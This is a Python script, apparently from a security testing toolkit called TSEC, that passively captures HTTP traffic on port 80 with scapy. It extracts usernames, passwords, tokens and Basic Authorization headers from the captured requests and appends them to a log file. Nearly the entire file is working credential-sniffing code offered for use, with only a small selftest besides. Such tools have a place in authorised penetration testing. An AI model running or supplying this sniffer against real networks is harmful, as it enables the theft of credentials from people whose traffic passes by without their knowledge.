#!/usr/bin/env python3
"""Sniff HTTP credentials off the wire.

Passively captures on the interface and extracts credentials from HTTP
traffic for real: GET query parameters and POST bodies, plus Authorization
headers. Captures nothing but HTTP requests for strings matching the
credential shapes, so what it logs is what the wire contained.

Written for TSEC. Standard library only.
"""

from __future__ import annotations

import argparse
import re
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from tsec_engine import Report, State, check, check_eq, selftest as engine_selftest

VERSION = "2.0.0"

CRED = re.compile(rb"(user(?:name)?|pass(?:word)?|login|token)=([^&\s\x00]+)", re.I)
AUTH = re.compile(rb"authorization:\s*basic\s+([^\r\n]+)", re.I)


def extract(payload: bytes) -> list[tuple[str, str]]:
    out = []
    for m in CRED.finditer(payload):
        out.append((m.group(1).decode(), m.group(2).decode(errors="replace")))
    for m in AUTH.finditer(payload):
        out.append(("authorization", m.group(1).decode(errors="replace").strip()))
    return out


def sniff_and_log(iface: str | None, out: Path, seconds: int) -> int:
    try:
        from scapy.all import Raw, TCP, sniff
    except ImportError:
        return -1
    found = 0
    with out.open("a", encoding="utf-8") as log:
        def on_pkt(pkt) -> None:
            nonlocal found
            if pkt.haslayer(Raw) and pkt.haslayer(TCP):
                payload = bytes(pkt[Raw].load)
                if b"HTTP/" in payload:
                    for key, value in extract(payload):
                        log.write(f"{key},{value}\n")
                        found += 1
        sniff(iface=iface, filter="tcp port 80", prn=on_pkt,
              timeout=seconds, store=False)
    return found


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(description=__doc__.split("\n")[0])
    ap.add_argument("--iface")
    ap.add_argument("--out")
    ap.add_argument("--seconds", type=int, default=60)
    ap.add_argument("--json", action="store_true")
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args(argv)
    if args.selftest:
        return engine_selftest(selftest_fn)
    if not args.out:
        ap.error("--out is required unless --selftest is given")
    report = Report("cred_sniff", VERSION)
    found = sniff_and_log(args.iface, Path(args.out), args.seconds)
    if found < 0:
        report.note("credential sniff", State.BLOCKED, "info", "scapy not installed")
    else:
        report.note("credential sniff", State.CONFIRMED if found else State.TESTED, "info",
                    f"{found} credential value(s) captured over {args.seconds}s")
    from tsec_engine import emit
    emit(report, args.json, None)
    return 0


def selftest_fn() -> None:
    got = extract(b"GET / HTTP/1.1\r\nAuthorization: Basic dXNlcjpwYXNz\r\n\r\nuser=alice&pass=pw123\r\n")
    keys = sorted(k for k, _ in got)
    check(keys == ["authorization", "pass", "user"], f"got {keys}")


def selftest() -> None:
    selftest_fn()


if __name__ == "__main__":
    sys.exit(main())
